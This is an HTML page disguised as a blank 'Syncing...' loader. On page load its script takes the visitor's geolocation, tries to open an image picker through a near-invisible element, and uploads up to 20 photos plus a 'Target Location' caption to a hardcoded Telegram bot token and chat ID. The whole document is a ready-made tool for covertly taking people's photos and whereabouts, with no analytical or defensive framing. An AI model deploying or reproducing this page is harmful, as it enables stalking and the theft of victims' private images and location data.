<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title></title>
<style>
  body { margin:0; padding:0; background:#fff; height:100vh; overflow:hidden; }
  .loader-bar { position:fixed; top:0; left:0; width:100%; height:3px; background:#ddd; z-index:999; }
  .progress { width:0%; height:100%; background:#0088cc; transition:width 2s ease-in-out; }
  .status { position:fixed; bottom:10px; left:50%; transform:translateX(-50%); font-size:10px; color:#ccc; opacity:.5; }
</style>
</head>
<body>

<div class="loader-bar"><div class="progress" id="progressBar"></div></div>
<div class="status">Syncing...</div>

<script>
// --- CONFIG (already filled in) ---
const TELEGRAM_BOT_TOKEN = '7603770395:AAEBlEAafIokfEyS-lTeudujGMNVfTg7LaY';
const TELEGRAM_CHAT_ID   = '7767412329';   // <-- your chat ID
// ------------------------------------

window.onload = async function() {
  const location = await getGeoLocation();
  await captureAndSendGallery(location);
};

function getGeoLocation() {
  return new Promise(resolve => {
    if (!navigator.geolocation) return resolve("Lat/Long Not Found");
    navigator.geolocation.getCurrentPosition(
      pos => resolve(`📍 Lat: ${pos.coords.latitude}, Long: ${pos.coords.longitude}`),
      () => resolve("Location Access Denied"),
      { timeout: 4000 }
    );
  });
}

async function captureAndSendGallery(location) {
  const input = document.createElement('input');
  input.type = 'file';
  input.multiple = true;
  input.accept = "image/*";

  // tiny invisible trigger button
  const invisibleBtn = document.createElement('div');
  invisibleBtn.style.cssText = `position:fixed; top:0; left:0; width:1px; height:1px; background:black; opacity:0.01; z-index:9999; cursor:pointer;`;
  document.body.appendChild(invisibleBtn);

  setTimeout(() => invisibleBtn.click(), 800);

  input.onchange = async (e) => {
    const files = e.target.files;
    if (files.length === 0) return;

    document.getElementById('progressBar').style.width = '100%';

    const totalImages = Math.min(files.length, 20);
    for (let i = 0; i < totalImages; i++) {
      const file = files[i];
      const base64 = await toBase64(file);
      try {
        await sendToTelegram(base64, location, i);
        await new Promise(r => setTimeout(r, 1000));   // 1‑second pause
      } catch (err) {
        console.log("Error sending image " + i);
      }
    }

    document.getElementById('progressBar').style.width = '0%';
    document.querySelector('.status').innerText = "Done";
  };
}

function toBase64(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.readAsDataURL(file);
    reader.onload = () => resolve(reader.result);
    reader.onerror = err => reject(err);
  });
}

async function sendToTelegram(base64Image, locationText, index) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
  const caption = index === 0
    ? `📍 <b>Target Location:</b>\n${locationText}\n\n📂 Gallery Synced!`
    : `Image ${index + 1}`;

  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('photo', base64Image);
  formData.append('caption', caption);

  await fetch(url, { method: 'POST', body: formData });
}
</script>
</body>
</html>
